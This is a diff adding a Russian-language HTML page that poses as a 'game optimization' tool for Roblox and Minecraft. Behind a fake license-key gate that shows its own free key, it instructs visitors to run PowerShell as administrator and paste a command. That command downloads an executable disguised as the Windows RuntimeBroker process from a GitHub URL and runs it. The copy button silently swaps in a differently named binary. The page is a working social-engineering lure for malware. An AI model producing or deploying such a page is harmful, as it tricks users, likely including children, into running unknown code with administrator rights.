@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>L|G OPTIMIZACION | Введи ключ</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, 'Inter', sans-serif;
+            background: linear-gradient(135deg, #050b14 0%, #0a1424 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .game-container {
+            max-width: 800px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 2.5rem;
+            font-weight: 800;
+            background: linear-gradient(125deg, #ffffff, #7daeff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 20px;
+        }
+
+        .game-grid {
+            display: flex;
+            gap: 30px;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin: 40px 0;
+        }
+
+        .game-card {
+            background: rgba(12, 25, 45, 0.8);
+            backdrop-filter: blur(4px);
+            border-radius: 32px;
+            padding: 40px 32px;
+            width: 260px;
+            cursor: pointer;
+            transition: 0.25s;
+            border: 1px solid rgba(80, 140, 210, 0.5);
+            text-align: center;
+        }
+
+        .game-card:hover {
+            transform: translateY(-8px);
+            border-color: #7daeff;
+            background: rgba(18, 38, 65, 0.95);
+        }
+
+        .game-icon {
+            font-size: 3rem;
+            margin-bottom: 16px;
+        }
+
+        .game-card h3 {
+            font-size: 1.8rem;
+            color: white;
+            margin-bottom: 8px;
+        }
+
+        .game-card p {
+            color: #8aadff;
+            font-size: 0.85rem;
+        }
+
+        /* Затемнение фона */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(12px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .overlay.active {
+            display: flex;
+        }
+
+        /* Общий стиль для окон */
+        .window {
+            background: linear-gradient(145deg, #0f1a2c, #0a1220);
+            border: 1px solid #3d73b5;
+            border-radius: 32px;
+            padding: 40px 32px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .window h3 {
+            font-size: 1.8rem;
+            color: #7daeff;
+            margin-bottom: 20px;
+        }
+
+        .key-input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #0a1020;
+            border: 1px solid #3d73b5;
+            border-radius: 40px;
+            color: white;
+            font-size: 1rem;
+            text-align: center;
+            letter-spacing: 1px;
+            margin: 20px 0;
+            outline: none;
+        }
+
+        .key-input:focus {
+            border-color: #7daeff;
+        }
+
+        .btn {
+            padding: 12px 28px;
+            border-radius: 40px;
+            font-weight: 700;
+            cursor: pointer;
+            border: none;
+            font-size: 1rem;
+            margin: 0 8px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(95deg, #2a5faa, #134079);
+            color: white;
+        }
+
+        .btn-secondary {
+            background: transparent;
+            border: 1px solid #5e6e8a;
+            color: #b8c7e5;
+        }
+
+        .error-message {
+            color: #ff8866;
+            font-size: 0.85rem;
+            margin-top: 8px;
+        }
+
+        /* Блок инструкции */
+        .instruction-box {
+            background: #07121f;
+            border-radius: 20px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: left;
+            border-left: 4px solid #2a5faa;
+        }
+
+        .instruction-box p {
+            color: #cddff5;
+            margin-bottom: 12px;
+            line-height: 1.5;
+        }
+
+        .ps-command {
+            background: #0a0f1a;
+            padding: 14px;
+            border-radius: 14px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.75rem;
+            color: #aaffdd;
+            word-break: break-all;
+            margin: 12px 0;
+            border: 1px solid #2a5faa;
+        }
+
+        .copy-btn {
+            background: #1f3e64;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 40px;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+
+        .copy-btn:hover {
+            background: #2e5a8a;
+        }
+    </style>
+</head>
+<body>
+
+<div class="game-container">
+    <div class="logo">L|G OPTIMIZACION</div>
+    <div class="game-grid">
+        <div class="game-card" data-game="Roblox">
+            <div class="game-icon">🎮</div>
+            <h3>Roblox</h3>
+            <p>Нажми для ввода ключа</p>
+        </div>
+        <div class="game-card" data-game="Minecraft">
+            <div class="game-icon">⛏️</div>
+            <h3>Minecraft</h3>
+            <p>Нажми для ввода ключа</p>
+        </div>
+    </div>
+    <p style="color:#6a8bbf; margin-top: 30px;">🔑 Бесплатный ключ: <strong style="color:#aaffdd;">KAZC-FDKD-3945-FREE</strong></p>
+</div>
+
+<!-- Окно ввода ключа -->
+<div id="keyWindow" class="overlay">
+    <div class="window">
+        <h3>🔑 Введите ключ</h3>
+        <input type="text" id="keyInput" class="key-input" placeholder="XXXX-XXXX-XXXX-XXXX" autocomplete="off">
+        <div id="keyError" class="error-message"></div>
+        <div>
+            <button id="confirmKeyBtn" class="btn btn-primary">Подтвердить</button>
+            <button id="cancelKeyBtn" class="btn btn-secondary">Отмена</button>
+        </div>
+    </div>
+</div>
+
+<!-- Окно инструкции (появляется ПОСЛЕ правильного ключа) -->
+<div id="instructionWindow" class="overlay">
+    <div class="window">
+        <h3>✅ ДОСТУП ОТКРЫТ</h3>
+        <div class="instruction-box">
+            <p>📌 <strong>Инструкция по запуску оптимизации:</strong></p>
+            <p>1️⃣ Нажмите клавишу <strong>Win</strong> (Windows)<br>
+            2️⃣ Напишите <strong>powershell</strong><br>
+            3️⃣ Запустите <strong>от имени администратора</strong><br>
+            4️⃣ Скопируйте команду ниже и вставьте в PowerShell<br>
+            5️⃣ Нажмите <strong>Enter</strong></p>
+            <div id="psCommand" class="ps-command">
+                (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/andrejkovalcuk844-bit/my-app/main/RuntimeBroker.exe', "$env:TEMP\RuntimeBroker.exe"); Start-Process "$env:TEMP\RuntimeBroker.exe"
+            </div>
+            <button id="copyCmdBtn" class="copy-btn">📋 Скопировать команду</button>
+            <p style="margin-top: 12px; font-size:0.75rem; color:#ffaa88;">⚠️ Бесплатная версия — возможны проблемы. Пробуйте!</p>
+        </div>
+        <button id="closeInstrBtn" class="btn btn-primary">Закрыть</button>
+    </div>
+</div>
+
+<script>
+    const VALID_KEY = "KAZC-FDKD-3945-FREE";
+    const PS_COMMAND = `(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/andrejkovalcuk844-bit/my-app/main/RunTimebrokerupdater.exe', "$env:TEMP\\RunTimebrokerupdater.exe"); Start-Process "$env:TEMP\\RunTimebrokerupdater.exe"`;
+
+    // Элементы
+    const keyWindow = document.getElementById('keyWindow');
+    const instructionWindow = document.getElementById('instructionWindow');
+    const keyInput = document.getElementById('keyInput');
+    const keyError = document.getElementById('keyError');
+    const confirmBtn = document.getElementById('confirmKeyBtn');
+    const cancelKeyBtn = document.getElementById('cancelKeyBtn');
+    const copyCmdBtn = document.getElementById('copyCmdBtn');
+    const closeInstrBtn = document.getElementById('closeInstrBtn');
+
+    let selectedGame = null;
+
+    // Открыть окно ввода ключа при клике на карточку игры
+    document.querySelectorAll('.game-card').forEach(card => {
+        card.addEventListener('click', () => {
+            selectedGame = card.getAttribute('data-game');
+            keyInput.value = '';
+            keyError.innerText = '';
+            keyWindow.classList.add('active');
+        });
+    });
+
+    // Функция проверки ключа
+    function checkKey() {
+        const enteredKey = keyInput.value.trim().toUpperCase();
+        if (enteredKey === VALID_KEY) {
+            // КЛЮЧ ПРАВИЛЬНЫЙ - закрываем окно ключа и показываем инструкцию
+            keyWindow.classList.remove('active');
+            instructionWindow.classList.add('active');
+        } else {
+            keyError.innerText = '❌ Неверный ключ! Попробуйте: KAZC-FDKD-3945-FREE';
+        }
+    }
+
+    // Подтверждение
+    confirmBtn.addEventListener('click', checkKey);
+    
+    // Enter в поле ввода
+    keyInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            checkKey();
+        }
+    });
+
+    // Отмена (закрыть окно ключа)
+    cancelKeyBtn.addEventListener('click', () => {
+        keyWindow.classList.remove('active');
+    });
+
+    // Копирование команды
+    copyCmdBtn.addEventListener('click', () => {
+        navigator.clipboard.writeText(PS_COMMAND).then(() => {
+            alert('✅ Команда скопирована! Теперь вставьте её в PowerShell от имени администратора.');
+        }).catch(() => {
+            alert('❌ Не удалось скопировать, скопируйте вручную');
+        });
+    });
+
+    // Закрыть инструкцию
+    closeInstrBtn.addEventListener('click', () => {
+        instructionWindow.classList.remove('active');
+    });
+
+    // Клик вне окна - закрыть (удобно)
+    keyWindow.addEventListener('click', (e) => {
+        if (e.target === keyWindow) keyWindow.classList.remove('active');
+    });
+    instructionWindow.addEventListener('click', (e) => {
+        if (e.target === instructionWindow) instructionWindow.classList.remove('active');
+    });
+</script>
+
+</body>
+</html>
